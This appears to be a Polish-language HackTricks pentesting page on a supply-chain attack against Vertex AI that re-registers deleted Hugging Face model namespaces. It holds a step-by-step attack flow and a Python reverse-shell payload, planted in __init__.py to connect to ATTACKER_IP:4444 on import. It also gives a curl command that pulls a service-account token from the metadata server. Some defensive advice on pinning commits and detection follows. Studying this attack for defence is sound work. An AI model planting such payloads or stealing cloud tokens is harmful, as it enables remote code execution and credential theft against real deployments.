# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scenariusz

- Vertex AI Model Garden umożliwia bezpośrednie wdrażanie wielu modeli Hugging Face (HF).
- Identyfikatory modeli HF to Author/ModelName. Jeśli autor/org na HF zostanie usunięty, ta sama nazwa autora może zostać ponownie zarejestrowana przez dowolną osobę. Atakujący mogą wtedy utworzyć repo z tym samym ModelName pod legacy path.
- Pipelines, SDKs lub cloud catalogs, które pobierają zasoby tylko po nazwie (bez pinning/integrity), pobiorą repo kontrolowane przez atakującego. Gdy model zostanie wdrożony, loader code z tego repo może wykonać się wewnątrz kontenera endpointa Vertex AI, dając RCE z uprawnieniami endpointa.

Dwa typowe przypadki przejęcia na HF:
- Usunięcie własności: stara ścieżka zwraca 404 aż do momentu, gdy ktoś ponownie zarejestruje autora i opublikuje ten sam ModelName.
- Transfer własności: HF zwraca 307 redirecty ze starego Author/ModelName do nowego autora. Jeśli stary autor zostanie później usunięty i ponownie zarejestrowany przez atakującego, łańcuch przekierowań zostaje przerwany i repo atakującego odpowiada pod legacy path.

## Identyfikacja powtórnie używalnych przestrzeni nazw (HF)

- Stary autor usunięty: strona autora zwraca 404; ścieżka modelu może zwracać 404 aż do przejęcia.
- Przeniesione modele: stara ścieżka modelu zwraca 307 do nowego właściciela dopóki stary autor istnieje. Jeśli stary autor zostanie później usunięty i ponownie zarejestrowany, legacy path zostanie rozwiązany na repo atakującego.

Szybkie sprawdzenia przy użyciu curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Przebieg ataku end-to-end przeciwko Vertex AI

1) Odkryj wielokrotnego użytku przestrzenie nazw modeli, które Model Garden pokazuje jako możliwe do wdrożenia:
- Znajdź modele HF w Vertex AI Model Garden, które nadal pokazują się jako „verified deployable”.
- Zweryfikuj na HF, czy oryginalny autor został usunięty lub czy model został przeniesiony, a stary autor później usunięty.

2) Ponownie zarejestruj usuniętego autora na HF i odtwórz tę samą ModelName.

3) Opublikuj złośliwe repo. Dołącz kod, który wykona się przy ładowaniu modelu. Przykłady kodu, które często wykonują się podczas ładowania modelu na HF:
- Efekty uboczne w pliku __init__.py repozytorium
- Niestandardowe pliki modeling_*.py lub kod przetwarzający odwoływany przez config/auto_map
- Ścieżki kodu wymagające trust_remote_code=True w pipelines Transformers

4) Deployment Vertex AI korzystający ze starego Author/ModelName teraz pobiera repo atakującego. Loader wykonuje się wewnątrz kontenera endpointu Vertex AI.

5) payload uzyskuje dostęp z środowiska endpointu (RCE) z uprawnieniami endpointu.

Przykładowy fragment payload, wykonywany przy imporcie (tylko do demonstracji):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Notatki
- Rzeczywiste loadery różnią się. Wiele integracji Vertex AI HF klonuje i importuje moduły z repo wskazywane w konfiguracji modelu (np. auto_map), co może wywołać wykonanie kodu. W niektórych przypadkach wymagane jest trust_remote_code=True.
- Endpoint zazwyczaj działa w dedykowanym containerze o ograniczonym zasięgu, ale stanowi ważny initial foothold dla dostępu do danych i lateral movement w GCP.

## Wskazówki po eksploatacji (Vertex AI Endpoint)

Gdy kod działa wewnątrz endpoint container, rozważ:
- Przeprowadzenie enumeracji zmiennych środowiskowych i metadata w poszukiwaniu poświadczeń/tokenów
- Dostęp do dołączonego storage lub zamontowanych model artifacts
- Interakcję z Google APIs poprzez service account identity (Document AI, Storage, Pub/Sub, etc.)
- Utrzymanie persistence w model artifact, jeśli platforma ponownie pobiera repo

Wylicz instance metadata, jeśli są dostępne (zależne od containera):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Wskazówki obronne dla użytkowników Vertex AI

- Przypinaj modele do commitów w HF loaders, aby zapobiec cichej podmianie:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Replikuj zweryfikowane modele HF do zaufanego wewnętrznego repozytorium/artifact registry i wdrażaj je stamtąd.
- Ciągle skanuj repozytoria kodu i konfiguracje w poszukiwaniu na stałe zakodowanych Author/ModelName, które zostały usunięte/przeniesione; zaktualizuj do nowych namespace’ów lub przypnij do konkretnego commita.
- W Model Garden weryfikuj pochodzenie modelu i istnienie autora przed wdrożeniem.

## Heurystyki rozpoznawcze (HTTP)

- Usunięty author: author page 404; legacy model path 404 aż do takeover.
- Przeniesiony model: legacy path 307 do nowego autora, gdy stary autor nadal istnieje; jeśli stary autor zostanie później usunięty i ponownie zarejestrowany, legacy path serwuje zawartość atakującego.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Odnośniki krzyżowe

- Zobacz szerszą metodologię i uwagi dotyczące łańcucha dostaw:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Referencje

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
